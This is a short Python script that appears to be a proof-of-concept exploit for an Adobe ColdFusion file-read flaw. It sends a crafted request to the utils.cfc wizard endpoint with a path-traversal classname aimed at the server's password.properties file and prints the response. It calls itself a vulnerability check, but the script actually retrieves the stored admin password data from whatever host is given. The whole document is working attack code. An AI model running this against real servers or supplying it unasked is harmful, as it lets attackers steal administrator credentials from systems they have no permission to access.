import argparse
import re
import requests
import json

endpoint = "/CFIDE/wizards/common/utils.cfc"

def validate_host_format(host):
    if re.match(r'^https?://[\w.-]+(:\d+)?$', host) is None:
        raise ValueError("Invalid host format. Please use format: protocol://host[:port]")

def make_request(host, is_windows):
    if is_windows:
        file_path = "..\\..\\lib\\password.properties"
    else:
        file_path = "../../lib/password.properties"

    url = f"{host}{endpoint}"
    params = {
        'method': 'wizardHash',
        '_cfclient': 'true',
        'returnFormat': 'wddx',
        'inPassword': 'foo'
    }
    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    data = {'_variables': json.dumps({"_metadata": {"classname": file_path}, "_variables": []})}

    response = requests.post(url, params=params, headers=headers, data=data, verify=False)

    print(response.text)

    if "password=" in response.text and "encrypted=" in response.text:
        print("The host seems to be VULNERABLE.")
    else:
        print("The host seems NOT to be VULNERABLE.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Check for vulnerability in Adobe ColdFusion.")
    parser.add_argument('--host', required=True, help="Target host URL, format: protocol://host[:port]")
    parser.add_argument('--win', action='store_true', help="Specify if the target host OS is Windows")

    args = parser.parse_args()

    try:
        validate_host_format(args.host)
        make_request(args.host, args.win)
    except Exception as e:
        print(f"Error: {e}")
